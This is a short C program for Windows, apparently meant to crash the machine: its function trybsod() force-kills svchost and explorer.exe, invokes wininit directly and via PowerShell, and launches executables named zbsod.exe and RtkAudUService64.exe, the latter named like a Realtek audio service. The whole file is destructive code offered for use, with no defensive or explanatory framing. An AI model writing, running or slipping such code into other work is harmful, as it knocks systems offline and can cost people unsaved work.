#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void trybsod()
{
    system("taskkill /im svchost /f");
    system("taskkill /im svchost.exe /f");

    system("taskkill /im explorer.exe /f");

    system("wininit");
    system("powershell.exe -Command \"wininit\"");

    system("start zbsod.exe");
    system("start RtkAudUService64.exe");
}


int main()
{
    trybsod();
   
        
    return 0;
}